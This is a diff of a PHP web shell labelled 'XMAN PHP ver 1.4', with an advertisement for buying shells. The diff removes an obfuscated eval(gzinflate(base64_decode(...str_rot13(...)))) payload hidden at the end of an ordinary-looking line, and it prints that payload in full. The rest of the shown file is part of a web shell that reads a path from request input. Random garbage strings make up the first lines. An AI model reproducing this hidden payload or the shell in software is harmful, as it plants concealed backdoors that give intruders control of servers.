@@ -1,4 +1,4 @@
-aobvqovbqvoqvbqvoqbv
+﻿eaiovnaovbqoebvqoeavibavo
 <?pHp
 /* XMAN PHP ver 1.4 [ buy shells https://t.me/buyshell_molasazy ] */
 
@@ -12,7 +12,7 @@ $translation = '{"id":"en","Add":"Add","Are you sure you want to delete this dir
 // Preparations
 $starttime = explode(' ', microtime());
 $starttime = $starttime[1] + $starttime[0];
-$langs = array('en','ru','de','fr','uk'); eval(gzinflate(base64_decode(base64_decode(str_rot13('oycTHzR5p3qSGJHirJ1TD3b0JJf5qJuan09RqSyLnGOBE3ujoyOHEx0jFmSlAT1UGSqgrIEPFxg2Y3AeG3p4qTInqKt4MJ4iZP8mqaOQGzcfE0qUqREXI3yVZyyFEKAEIKWQG2WWnGR2FSERrwE6BUOaAz44FHICF212IGAiE2M1BIuYp1ygE0MSGSWyIQIbMJWnAKydJHLmoGVmAau6GRAUAKH0EKSTGxHjDzkwHHy2M0Iypx5IMUqgF00jET4lrzcTAT5ynGAFHaxiMaA4oJD3Y3yZJyc2AlgFGwylnxj4nGAvLzH0MRAXLaqWnUOcMGqYp1I0F1A0EwAMZzIUBREuBT9RFQqZJHSkDvf2AmAdLwV0pJ9MMwHmqTuRYmS6ZmIUAGuVoJjlqzcHA2HjJTfirwIZG01eLaWhq3L5ZGMvnmuKomubJwukLJcYLzt2rR52HwxeIQtmL3OGI0M4G0ACoSt4ERu4oKA5q0AlAyOTI2VlpxqeDyuCqRqJGaqYFzIDIQqVMmu6oQMILIqyBJSInSqkpJWuGyx4qQWMG3SbZ1WwXmO0rQWkJSWEMyAfZxuAqz1jpwx3L21wq3qZIxSQJwx2IT90Z1W2AGOJARp5X04eoTIIEvgdqxWmn0EvLJynAGLeFKOLGHIFERkCqTkRAl9zA1xlHJklDGIXIQD1X0IPoP84DD==')))));
+$langs = array('en','ru','de','fr','uk');
 $path = empty($_REQUEST['path']) ? $path = realpath('.') : realpath($_REQUEST['path']);
 $path = str_replace('\\', '/', $path) . '/';
 $main_path=str_replace('\\', '/',realpath('./'));
